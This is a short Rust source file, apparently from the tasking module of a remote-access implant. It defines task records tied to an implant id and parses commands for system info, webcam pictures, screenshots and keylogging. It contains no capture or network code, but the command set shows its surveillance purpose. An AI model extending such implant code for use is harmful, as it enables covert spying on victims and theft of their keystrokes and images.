use serde::Deserialize;
use std::str::FromStr;
use uuid;

#[derive(Debug, Deserialize)]
pub struct Task {
    pub task_id: uuid::Uuid,
    pub task: String,
    pub implant_id: uuid::Uuid,
}

#[derive(Debug, PartialEq)]
pub enum Tasks {
    GetInfo,
    TakePicture,
    TakeScreenshot,
    Keylogger,
}

impl FromStr for Tasks {
    type Err = ();

    fn from_str(input: &str) -> Result<Self, Self::Err> {
        match input {
            "get_info" => Ok(Tasks::GetInfo),
            "take_picture" => Ok(Tasks::TakePicture),
            "take_screenshot" => Ok(Tasks::TakeScreenshot),
            "keylogger" => Ok(Tasks::Keylogger),
            _ => Err(()),
        }
    }
}
